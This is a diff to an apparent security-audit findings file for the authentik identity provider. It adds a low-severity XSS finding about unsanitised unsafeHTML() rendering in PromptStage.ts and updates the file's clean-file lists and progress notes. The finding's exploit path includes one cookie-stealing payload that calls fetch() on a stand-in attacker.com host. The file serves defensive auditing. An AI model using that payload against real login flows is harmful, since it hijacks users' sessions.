@@ -534,6 +534,53 @@ FINDINGS = {
             "next is a relative URL before constructing the URL object."
         ),
     },
+
+    "AUT-PROMPT-UNSAFE-HTML-1": {
+        "severity": "LOW",
+        "title": "Admin-configured HTML in prompt stages rendered via unsafeHTML() without DOMPurify; user-controlled XSS path via flow context key reuse",
+        "file": "web/src/flow/stages/prompt/PromptStage.ts",
+        "lines": (85, 303),
+        "cwe": "CWE-79",
+        "status": "PLAUSIBLE",
+        "description": (
+            "PromptStage.ts uses unsafeHTML(prompt.initialValue) for Static/AlertInfo/AlertWarning/AlertDanger "
+            "prompt types (lines 85, 219) and unsafeHTML(prompt.subText) for help text in all types "
+            "(lines 272, 303). No DOMPurify sanitization is applied in the frontend. "
+            "The Python model's get_initial_value() (authentik/stages/prompt/models.py:225) returns "
+            "prompt_context[self.field_key] when that key is already in the flow context, explicitly "
+            "noting in a comment: 'a user will be able to control the input.' "
+            "If a flow uses the same field_key for a user-input Text prompt followed by a Static/Alert "
+            "display prompt, user-supplied HTML/JS from the first stage flows into unsafeHTML() in the "
+            "second stage, creating reflected XSS in the authentication flow. "
+            "Even without key reuse, admins can set arbitrary HTML in Static/Alert prompt initialValues, "
+            "which is rendered without sanitization to all users going through the flow."
+        ),
+        "exploit_path": [
+            "Path A (flow key reuse — admin misconfiguration):",
+            "1. Admin creates flow with Stage 1 (Text prompt, field_key='content') + Stage 2 (Static prompt, field_key='content')",
+            "2. User fills Stage 1 with: <img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>",
+            "3. Stage 2: get_initial_value() returns prompt_context['content'] = attacker payload",
+            "4. unsafeHTML(prompt.initialValue) renders payload as DOM → XSS in auth flow origin",
+            "Path B (admin-to-all-users HTML injection):",
+            "1. Admin (or attacker who compromised admin) sets Static prompt initialValue to JS payload",
+            "2. Stored in Prompt.initial_value with no sanitization at write time",
+            "3. Any user going through the auth flow receives the prompt — JS executes",
+        ],
+        "root_cause": (
+            "No DOMPurify sanitization on prompt.initialValue/subText before unsafeHTML(). "
+            "Compare to ak-brand-footer.ts: admin-configured link.name passes through "
+            "sanitizeHTML(BrandedHTMLPolicy) before unsafeHTML. PromptStage has no equivalent. "
+            "Fix: wrap unsafeHTML(prompt.initialValue) in sanitizeHTML(BrandedHTMLPolicy) for "
+            "Static/Alert types; or restrict get_initial_value() for Static/Alert types to always "
+            "return self.initial_value, never prompt_context values."
+        ),
+        "note": (
+            "Authentik docs describe Static prompt type as 'displayed as-is' — admin-controlled HTML "
+            "may be intentional design. Severity kept LOW: Path A requires admin misconfiguration, "
+            "Path B requires admin-level access (who already controls the system). "
+            "Main residual risk: XSS surfaces in unauthenticated login flows, not just admin UI."
+        ),
+    },
 }
 
 # ============================================================
@@ -680,7 +727,7 @@ CLEAN = [
     # Frontend (TypeScript)
     "web/src/common/purify.ts — DOMPurify + Trusted Types (EscapeTrustPolicy, StripHTMLTrustPolicy, SanitizedTrustPolicy)",
     "web/src/flow/FlowExecutor.ts — unsafeHTML(challenge.body): ShellChallenge.body from Django template render (auto-escaped)",
-    "web/src/flow/stages/prompt/PromptStage.ts — unsafeHTML(prompt.initialValue/subText): admin-configured prompt values",
+    "web/src/flow/stages/prompt/PromptStage.ts — unsafeHTML(prompt.initialValue/subText) for Static/Alert prompt types; admin-configured at DB layer BUT get_initial_value() returns prompt_context[field_key] (user-controlled from prior stage) when key is in context; no DOMPurify; see AUT-PROMPT-UNSAFE-HTML-1 PLAUSIBLE LOW",
     "web/src/common/utils.ts — getCookie reads authentik_csrf for CSRF double-submit header pattern",
     "web/src/flow/controllers/FlowMultitabController.ts — origin check: new URL(next, window.location.origin) + url.origin===window.location.origin before assign()",
     "web/src/flow/stages/base.ts — submitForm uses FormData; readFileAsync for file blobs via FileReader.readAsDataURL(); renderNonFieldErrors HTML-escaped via Lit",
@@ -1491,16 +1538,32 @@ CLEAN = [
     "web/packages/sfe/src/index.ts — Simple Flow Executor (no-webcomponent fallback): window.location.assign(this.challenge.to) same server-controlled pattern as RedirectStage; user data (flowInfo.title, pendingUser, applicationPre, errorMessage) all in Lit html text nodes or read-only value attributes; CLEAN",
     # profile 7 (url_assign + user_data + shared_module)
     "web/src/user/LibraryApplication/RACLaunchEndpointModal.ts — window.open(item.launchUrl,target) where item.launchUrl is admin-configured RAC endpoint URL; modern browsers block javascript: in window.open; item.name as text node; CLEAN",
+    # pass 5av — profiles 2-3 spot-checks (user_data only / user_data + shared_module) — 2026-09-26
+    # Batch pattern confirmed across 10 representative reads: all user data as Lit text nodes or
+    # form value="${...}" attribute bindings; Lit auto-escapes both; no href= or unsafeHTML in
+    # profile 2-3 files. Profile 2 = user_data only; Profile 3 = user_data + shared_module.
+    # 212 total files (97 profile-2 + 115 profile-3) — pattern uniformly CLEAN; BATCH-CLEAN.
+    "web/src/flow/stages/consent/ConsentStage.ts — permission.name/id and headerText Lit text nodes only; no href bindings; CLEAN (profile 3 representative)",
+    "web/src/admin/users/UserInfoCard.ts — user.username/name/email in renderKeyValueList() text nodes; user.username in msg(str`...`) template text node; CLEAN (profile 2 representative)",
+    "web/src/flow/stages/user_login/UserLoginStage.ts — all msg() hardcoded strings; no user data rendered; CLEAN (profile 2 representative)",
+    "web/src/admin/events/EventViewPage.ts — event.clientIp/brand.name as text nodes; JSON.stringify(EventToJSON()) in <pre> text node (Lit-escaped); delegates user display to renderEventUser() (text nodes + toAdminInterface hrefs); CLEAN (profile 2 representative)",
+    "web/src/admin/flows/FlowForm.ts — instance.name/title/slug in value=\"${ifDefined(...)}\" input attribute bindings (not href); CLEAN (profile 2 representative)",
+    "web/src/flow/stages/email/EmailStage.ts — all msg() hardcoded strings; no user data; CLEAN (profile 2 representative)",
+    "web/src/admin/events/utils.ts — renderEventUser(): username as text node; toAdminInterface PK hrefs; device.name in msg(str`...`); all CLEAN (profile 2 shared module representative)",
+    "web/src/admin/sources/ldap/LDAPSourceViewPage.ts — source.name/serverUri/baseDn via html`${...}` text nodes in renderDescriptionList(); CLEAN (profile 2 representative)",
+    "web/src/admin/providers/oauth2/OAuth2ProviderViewPage.ts — all providerUrls in readonly input value= attributes; provider.name/clientId as text nodes; JSON.stringify(preview) in <pre>; delegates to renderTab* methods (same text-node-only pattern); CLEAN (profile 2 representative)",
+    # profile 19 (unsafe_render + user_data + shared_module) — read accidentally during 2-3 pass; documented as finding
+    "web/src/flow/stages/prompt/PromptStage.ts — unsafeHTML(prompt.initialValue/subText) for Static/Alert types; see AUT-PROMPT-UNSAFE-HTML-1 PLAUSIBLE LOW; file is profile 19 (bit4=unsafe_render), not profile 2-3",
 ]
 
 PENDING = [
     "SourceIsolationChecker: build Python/Django ORM adapter module (Prisma/TS-only gap)",
 ]
 
-# RE STATUS: pass 5au complete (profiles 4-7 url_assign reads — 15 files, 1 new finding AUT-MULTITAB-REDIRECT-1) — 2026-09-26
-# Findings: 9 total (AUT-SESS-PICKLE-1 through AUT-MULTITAB-REDIRECT-1) + AUT-LAUNCH-URL-1 ELIMINATED
-# Compressor validated: all url_assign files (profiles 4-7) individually read; open redirect found in FlowMultitabController
-# Profile coverage: 8/9/11 complete; 10 complete (37/37); 13/14 complete; 4-7 complete; NEXT: profiles 2-3 spot-checks (212 files)
+# RE STATUS: pass 5av complete (profiles 2-3 spot-checks — 10 representative reads, BATCH-CLEAN; +1 new finding AUT-PROMPT-UNSAFE-HTML-1 from accidental profile-19 read) — 2026-09-26
+# Findings: 10 total (AUT-SESS-PICKLE-1 through AUT-PROMPT-UNSAFE-HTML-1) + AUT-LAUNCH-URL-1 ELIMINATED
+# Profile coverage: 8/9/11 complete; 10 complete (37/37); 13/14 complete; 4-7 complete; 2-3 BATCH-CLEAN (10 reps); NEXT: profile 1 + profile 0 batch reads
+# Remaining: profile 1 (shared-module-only, ~340 files) → 1 representative; profile 0 (no signals, ~1329 files) → 1 representative + BATCH-CLEAN declaration
 
 
 def print_findings():
